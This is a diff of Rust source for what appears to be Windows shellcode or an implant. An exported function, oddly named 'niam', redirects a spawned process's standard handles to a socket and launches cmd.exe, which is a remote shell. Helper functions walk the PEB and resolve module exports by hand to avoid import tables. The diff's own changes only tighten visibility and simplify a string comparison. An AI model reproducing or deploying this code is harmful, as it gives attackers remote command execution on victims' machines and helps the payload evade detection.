@@ -114,7 +114,6 @@ pub unsafe extern "C" fn niam() {
     startupinfo.hStdError = socket as _;
 
     let mut process_information = MaybeUninit::<PROCESS_INFORMATION>::zeroed();
-
     let cmdline = s!("cmd.exe").cast_mut();
 
     create_process(
@@ -133,7 +132,7 @@ pub unsafe extern "C" fn niam() {
     let _process_information = process_information.assume_init();
 }
 
-pub(crate) fn peb_inner() -> *mut windows_sys::Win32::System::Threading::PEB {
+fn peb_inner() -> *mut windows_sys::Win32::System::Threading::PEB {
     let ptr: *mut windows_sys::Win32::System::Threading::PEB;
     unsafe {
         asm!(
@@ -144,7 +143,7 @@ pub(crate) fn peb_inner() -> *mut windows_sys::Win32::System::Threading::PEB {
     ptr
 }
 
-pub fn str_u16_len(ptr: *const u16) -> usize {
+fn str_u16_len(ptr: *const u16) -> usize {
     let mut cur = ptr;
 
     let mut len = 0;
@@ -194,39 +193,7 @@ unsafe fn get_image_export_directory(
     Ok(image_export_directory)
 }
 
-pub unsafe fn str_from_u16_ptr(ptr: *const u16, len: usize, res: &mut [u8]) {
-    let slice = core::slice::from_raw_parts(ptr, len);
-
-    for (idx, i) in slice.iter().enumerate() {
-        let Some(val) = res.get_mut(idx) else { return };
-
-        *val = *i as u8;
-    }
-}
-
-pub fn str16_case_unsensitive_equals(a: &[u16], b: &[u16]) -> bool {
-    if a.len() != b.len() {
-        return false;
-    }
-    let mut abuffer = [0u8; 256];
-    let mut bbuffer = [0u8; 256];
-
-    unsafe { str_from_u16_ptr(a.as_ptr(), a.len(), &mut abuffer) };
-    unsafe { str_from_u16_ptr(b.as_ptr(), b.len(), &mut bbuffer) };
-
-    let res_a = unsafe { core::str::from_utf8_unchecked(&abuffer) };
-    let res_b = unsafe { core::str::from_utf8_unchecked(&bbuffer) };
-
-    for (a, b) in res_a.chars().zip(res_b.chars()) {
-        if !a.eq_ignore_ascii_case(&b) {
-            return false;
-        }
-    }
-
-    true
-}
-
-pub unsafe fn load_module(name: &[u16]) -> Option<*mut c_void> {
+unsafe fn load_module(name: &[u16]) -> Option<*mut c_void> {
     let peb_handle = peb_inner();
 
     let ldr_data = (*peb_handle).Ldr;
@@ -241,7 +208,7 @@ pub unsafe fn load_module(name: &[u16]) -> Option<*mut c_void> {
         let name_len = str_u16_len(dll_name_buffer).min(dll_name_len);
         let dll_name = core::slice::from_raw_parts(dll_name_buffer, name_len);
 
-        if str16_case_unsensitive_equals(dll_name, name) {
+        if dll_name == name {
             return (*module_list).Reserved2[0].into();
         }
 
@@ -253,7 +220,7 @@ pub unsafe fn load_module(name: &[u16]) -> Option<*mut c_void> {
     None
 }
 
-pub unsafe fn module_function(
+unsafe fn module_function(
     module_base_addr: *mut c_void,
     function_name: &[u8],
 ) -> Result<*mut c_void, ()> {
